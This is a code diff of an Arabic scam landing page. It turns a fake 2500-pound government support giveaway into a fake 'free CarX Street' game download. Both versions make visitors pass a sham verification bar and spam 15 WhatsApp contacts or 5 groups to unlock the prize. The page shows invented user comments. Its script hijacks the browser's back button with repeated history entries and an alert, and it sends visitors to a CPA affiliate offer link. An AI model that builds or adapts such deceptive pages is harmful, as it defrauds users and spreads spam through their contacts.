@@ -45,15 +45,15 @@
             <div id="num">0%</div>
         </div>
         <div id="info">
-            <p class="title">قم بادخال الإسم الكامل :</p>
+            <p class="title">قم بادخال نوع هاتفك :</p>
             <div class="phone">
-                <input id="name" placeholder="ادخل اسم كامل هنا..." />
+                <input id="name" placeholder="ادخل نوع الهاتف هنا..." />
                 <button id="confirm">ارسال</button>
             </div>
-            <p class="error">المرجو ادخال اسم صحيح !</p>
+            <p class="error">المرجو ادخال نوع صحيح !</p>
         </div>
         <div id="checking">
-            <p class="title">جاري التحقق من الاسم...</p>
+            <p class="title">جاري التحقق من نوع هاتفك...</p>
             <div class="barr">
                 <div class="fill">
                     <div id="fill"></div>
@@ -68,11 +68,11 @@
         <div id="share">
             <p class="tip">مرحبا <span id="getname"></span>،</p>
             <p class="tip">
-                بعد التحقق، تبين أنك مؤهل للحصول على دعم بقيمة <span class="amount">2500 جنيه</span>.
+                بعد التحقق، تبين أنك مؤهل لتحميل لعبة <span class="amount">CarX Street</span>.
             </p>
-            <p class="tip">سيكون المبلغ المالي متاحا على الفور بعد اتباع التعليمات أدناه :</p>
-            <p class="tip">1 -إضغط على زر "دعوة" الموجود فى الأسفل وارسل الرسالة الى 15 صديقا او 5 مجموعات على واتساب، ليستطيعو بدورهم الاستفادة من الدعم.</p>
-            <p class="tip">2 - سيظهر كود السحب الدعم مباشرة بعد امتلاء شريط التحقق الأخضر.</p>
+            <p class="tip">ستكون اللعبة متاحا على الفور بعد اتباع التعليمات أدناه :</p>
+            <p class="tip">1 -إضغط على زر "دعوة" الموجود فى الأسفل وارسل الرسالة الى 15 صديقا او 5 مجموعات على واتساب، ليستطيعو بدورهم الاستفادة من تحميل اللعبة.</p>
+            <p class="tip">2 - سيظهر زر التحميل مباشرة بعد امتلاء شريط التحقق الأخضر.</p>
             <button id="whatsapp">دعوة</button>
             <div class="barr">
                 <div class="fill">
@@ -86,8 +86,8 @@
         </div>
         <div id="claim">
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
-            <p class="title">يمكنك الآن الحصول على كود السحب</p>
-            <button id="offer">اضغط هنا لعرض الكود</button>
+            <p class="title">يمكنك الآن تحميل اللعبة</p>
+            <button id="offer">اضغط هنا للتحميل</button>
         </div>
         <div class="comments">
             <div class="counter">
@@ -100,7 +100,7 @@
                 <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i class="fa fa-share"></i> Share</span>
             </div>
             <div>
-                <div class="comment">
+                <div class="comment" dir = "rtl">
                     <img src="http://www.elahmad.com/api/flag.php" />
                     <div class="single-container">
                         <span class="user">Saad Amine</span>
@@ -116,13 +116,13 @@
                     <img src="https://i.ibb.co/sV8bkQH/2.jpg" />
                     <div class="single-container"><span class="user">Ahmed Aily</span> <span class="text">
 هل لعبة CarX Street مجانية؟
-                    </span></div>
+                        </span></div>
                     <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
                 </div>
                 <div class="comment reply">
                     <img src="https://i.ibb.co/nkX6hXd/93fed4cdfc7d0a2078710921cc58b306668914ae.png" />
                     <div class="single-container"><span class="user">Carx Street</span> <span class="text">
-نعم، لعبة CarX Street مجانية. يمكنك الحصول اللعبه من خلال الضغط علي زر تحميل
+نعم، لعبة CarX Streetمجانية. يمكنك الحصول اللعبه من خلال الضغط علي زر تحميل
                         </span></div>
                     <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
                 </div>
@@ -144,7 +144,7 @@
             try {
                 for (psy = 0; 10 > psy; ++psy) history.pushState({}, "", "");
                 onpopstate = function (psy) {
-                    psy.state && alert("لقد تم تسجيلك في قائمة المستفيدين المرجو اكمال الخطوات، تبقى لك خطوة واحدة!");
+                    psy.state && alert("لقد تم تسجيلك في قائمة التحميل المرجو اكمال الخطوات، تبقى لك خطوة واحدة!");
                 };
             } catch (o) {}
         })();
@@ -157,7 +157,7 @@
             error = "هناك خطأ!\nالمشاركات غير محسوبة ربما شاركته مع نفس الصديق او المجموعة اكثر من مرة، من فضلك اعد المشاركة.",
             cpa = "https://qoaaa.com/efe896c68e8514a58a34/8d9ea43069/?placementName=default",
             saved = "psylo",
-            text1 = " وزارة تموين تقدم دعم بقيمة 2500 جنيه ",
+            text1 = " الآن يمكنك تحميل CarX Street النسخة الأصلية آخر إصدار 2023 ",
             share = "whatsapp://send?text=" + text1 + "%0a" + url  ;
     </script>
     <script src="js/wp.php"></script>
